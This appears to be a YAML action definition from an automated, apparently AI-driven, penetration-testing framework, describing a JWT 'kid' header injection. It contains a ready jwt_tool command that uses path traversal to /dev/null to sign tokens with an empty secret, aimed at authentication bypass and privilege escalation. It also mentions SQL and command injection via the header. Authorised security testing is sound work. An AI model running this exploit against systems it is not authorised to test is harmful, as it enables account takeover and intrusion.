name: jwt_kid_injection
category: web
description: JWT kid header injection
preconditions:
- service.port==80
parameters:
  target_ip: from_engagement.target_ip
command_template: python3 jwt_tool.py '{token}' -I -hc kid -hv '../../../../../../dev/null'
  -S hs256 -p ''
parser: web_response_parser
expected_effects:
- auth_bypassed
- privilege_escalated
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: "JWT kid (key ID) header may be vulnerable to: path traversal (use /dev/null\
  \ as key \u2192 empty secret), SQL injection (extract secret from DB), command injection."
hacktricks_ref: pentesting-web/hacking-jwt-json-web-tokens.md
